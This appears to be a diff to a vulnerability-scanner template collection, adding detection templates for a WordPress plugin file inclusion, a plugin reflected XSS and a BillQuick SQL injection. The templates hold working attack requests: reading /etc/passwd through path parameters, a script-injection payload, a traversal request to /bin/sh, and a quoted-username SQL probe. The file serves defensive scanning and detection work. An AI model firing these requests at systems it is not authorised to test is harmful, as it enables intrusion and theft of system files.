@@ -8673,6 +8673,50 @@
       ]
     },
     {
+      "id": "CVE-2015-5471",
+      "info": {
+        "author": "0x_Akoko",
+        "classification": {
+          "cve-id": "CVE-2015-5471",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+          "cvss-score": 5.3,
+          "cwe-id": "CWE-22"
+        },
+        "description": "The code in ./wp-swimteam/include/user/download.php doesnt sanitize user input from downloading sensitive system files.",
+        "name": "Swim Team <= v1.44.10777 - Local File Inclusion",
+        "reference": [
+          "https://wpscan.com/vulnerability/b00d9dda-721d-4204-8995-093f695c3568",
+          "http://www.vapid.dhs.org/advisory.php?v=134",
+          "https://nvd.nist.gov/vuln/detail/CVE-2015-5471"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2015,wordpress,wp-plugin,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/wp-swimteam/include/user/download.php?file=/etc/passwd&filename=/etc/passwd&contenttype=text/html&transient=1&abspath=/usr/share/wordpress"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2015-5688",
       "info": {
         "author": "pikpikcu",
@@ -9800,6 +9844,57 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/hdw-tube/mychannel.php?channel=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000136",
+      "info": {
+        "author": "daffainfo",
+        "classification": {
+          "cve-id": "CVE-2016-1000136",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Reflected XSS in wordpress plugin heat-trackr v1.0",
+        "name": "heat-trackr v1.0 - XSS via heat-trackr_abtest_add.php",
+        "reference": [
+          "http://www.vapidlabs.com/wp/wp_advisory.php?v=798",
+          "https://nvd.nist.gov/vuln/detail/CVE-2016-1000136"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/heat-trackr/heat-trackr_abtest_add.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -37262,6 +37357,70 @@
             "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\n\necho Content-Type: text/plain; echo; echo 31024-1202-EVC | rev\n\n"
           ],
           "unsafe": true
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-42258",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "BQE BillQuick Web Suite 2018 through 2021 before 22.0.9.1\nallows SQL injection for unauthenticated remote code execution,\nas exploited in the wild in October 2021 for ransomware installation.\nSQL injection can, for example, use the txtID (aka username) parameter.\nSuccessful exploitation can include the ability to execute\narbitrary code as MSSQLSERVER$ via xp_cmdshell.\n",
+        "name": "BillQuick Web Suite SQLi",
+        "reference": [
+          "https://www.huntress.com/blog/threat-advisory-hackers-are-exploiting-a-vulnerability-in-popular-billing-software-to-deploy-ransomware",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-42258"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2021,sqli,billquick"
+      },
+      "requests": [
+        {
+          "cookie-reuse": true,
+          "extractors": [
+            {
+              "attribute": "value",
+              "internal": true,
+              "name": "VS",
+              "type": "xpath",
+              "xpath": [
+                "/html/body/form/div/input[@id='__VIEWSTATE']"
+              ]
+            },
+            {
+              "attribute": "value",
+              "internal": true,
+              "name": "VSG",
+              "type": "xpath",
+              "xpath": [
+                "/html/body/form/div/input[@id='__VIEWSTATEGENERATOR']"
+              ]
+            },
+            {
+              "attribute": "value",
+              "internal": true,
+              "name": "EV",
+              "type": "xpath",
+              "xpath": [
+                "/html/body/form/div/input[@id='__EVENTVALIDATION']"
+              ]
+            }
+          ],
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "System.Data.SqlClient.SqlException",
+                "Incorrect syntax near",
+                "_ACCOUNTLOCKED"
+              ]
+            }
+          ],
+          "raw": [
+            "GET / HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nReferer: {{BaseURL}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\n\n__EVENTTARGET=cmdOK&__EVENTARGUMENT=&__VIEWSTATE={{url_encode(\"§VS§\")}}&__VIEWSTATEGENERATOR={{url_encode(\"§VSG§\")}}&__EVENTVALIDATION={{url_encode(\"§EV§\")}}&txtID=uname%27&txtPW=passwd&hdnClientDPI=96\n"
+          ]
         }
       ]
     }
